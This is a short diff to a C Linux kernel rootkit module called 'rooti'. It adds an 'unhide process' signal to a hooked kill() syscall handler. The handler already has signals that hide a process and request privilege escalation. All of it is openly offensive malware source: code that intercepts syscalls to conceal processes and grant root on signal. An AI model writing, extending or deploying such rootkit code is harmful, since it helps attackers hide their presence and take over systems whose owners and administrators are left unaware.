@@ -31,7 +31,8 @@ MODULE_VERSION("1.0.0");
 
 // Unused signal numbers which can be used by the rootkit for its own purposes
 enum rooti_signal {
-    ROOTI_SIG_PROC_BIND = 62,   // request to bind to a proccess
+    ROOTI_SIG_PROC_BIND = 61,   // request to bind to a proccess
+    ROOTI_SIG_PROC_UNHIDE = 62, // request to unhide a process
     ROOTI_SIG_PROC_HIDE = 63,   // request to hide a process
     ROOTI_SIG_PE = 64           // request for privilege escalation
 };
@@ -76,7 +77,10 @@ static asmlinkage long hook_kill(const struct pt_regs *regs)
     else if (sig == ROOTI_SIG_PROC_HIDE) {
         return rooti_track_proc_attr(current->pid, ROOTI_PROC_HIDDEN, &rooti_tracked_procs);
     }
-
+    else if (sig == ROOTI_SIG_PROC_UNHIDE) {
+        rooti_untrack_proc_attr(current->pid, ROOTI_PROC_HIDDEN, &rooti_tracked_procs);
+        return 0;
+    }
     return orig_kill(regs);
 }
 
